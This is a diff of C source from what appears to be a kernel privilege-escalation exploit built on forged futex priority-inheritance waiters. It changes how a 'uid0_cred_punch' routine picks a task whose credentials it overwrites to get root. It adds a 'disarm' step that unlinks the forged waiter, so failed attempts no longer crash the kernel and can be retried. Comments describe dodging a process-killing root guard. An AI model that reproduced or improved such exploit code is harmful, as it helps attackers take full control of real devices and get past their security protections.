@@ -2260,19 +2260,26 @@ uid0_cred_punch:;
    * (ffffff87/88/89) self-punches missed 3/3 today (CapEff stayed 0);
    * the child punch hit (overnight 26225: child_status=0). Self only if
    * P0; else child raw (high alias is fine for the child). */
-  if (env_flag("UID0_PREFER_CHILD", 0) && task_ptr_ok(lch.x28) &&
+  if (env_flag("UID0_PREFER_CHILD", 0) && !env_flag("UID0_SELF_ONLY", 0) &&
+      task_ptr_ok(lch.x28) &&
       lch.x28_cnt >= 4) {
     /* Z33: parent stays 2000 so ROOTGUARD does not SIGKILL pselect.
      * High-alias child is allowed (do not wrap to P0). Slot +0x780. */
     use_task = lch.x28;
     ucnt = lch.x28_cnt;
     who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
-  } else if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4 &&
-      p0_dram_ptr(lself.x28)) {
+  } else if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4) {
+    /* 09-12 GhostLockAdapt synthesis: SELF at ANY alias (the raw high
+     * alias is the waiter's own task — the walk stores through it the
+     * same way). Self punches historically MISSED silently, they did
+     * not KP; the 09-12 child punch KP'd. With the disarm added below,
+     * a self miss is survivable → retryable. UID0_SELF_ONLY refuses
+     * the child fallback entirely. */
     use_task = lself.x28;
     ucnt = lself.x28_cnt;
-    who = "self_x28_p0";
-  } else if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 4) {
+    who = p0_dram_ptr(lself.x28) ? "self_x28_p0" : "self_x28";
+  } else if (!env_flag("UID0_SELF_ONLY", 0) &&
+             task_ptr_ok(lch.x28) && lch.x28_cnt >= 4) {
     use_task = lch.x28;
     ucnt = lch.x28_cnt;
     who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
@@ -2392,6 +2399,22 @@ uid0_cred_punch:;
       uid0_one_store(slot, env_flag("UID0_COMM_CANARY", 0)
                             ? "child_comm_canary"
                             : (self ? "self_cred" : "child_cred"));
+    }
+    /* DISARM (GhostLockAdapt poc-mcast-root step 7): instant-timeout
+     * FUTEX_LOCK_PI on a self-locked dummy forces the kernel slowpath,
+     * whose remove_waiter() clears the waiter thread's pi_blocked_on —
+     * unlinking the forged ghost from every PI tree. Without this the
+     * ghost stays linked and a later PI walk faults on it (their
+     * rb_erase+0x140 READ-fault finding = our walk KPs / ~17min freezes).
+     * With it, a miss is SURVIVABLE → retryable on the same boot. */
+    if (!env_flag("UID0_NO_DISARM", 0)) {
+      int dummy_pi = (int)(0x80000000U | (unsigned int)getpid());
+      struct timespec dts = { .tv_sec = 0, .tv_nsec = 0 };
+      long dr = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &dts, NULL, 0);
+      pr_info("UID0 DISARM self-lock ret=%ld errno=%d (ghost unlinked)\n",
+              dr, errno);
+      live_sync_log("UID0", "disarm_done");
+      durable_stage("uid0_disarm");
     }
     uid0_kill_watchers(watch, nw);
     nw = uid0_scan_watchers(watch, 32);
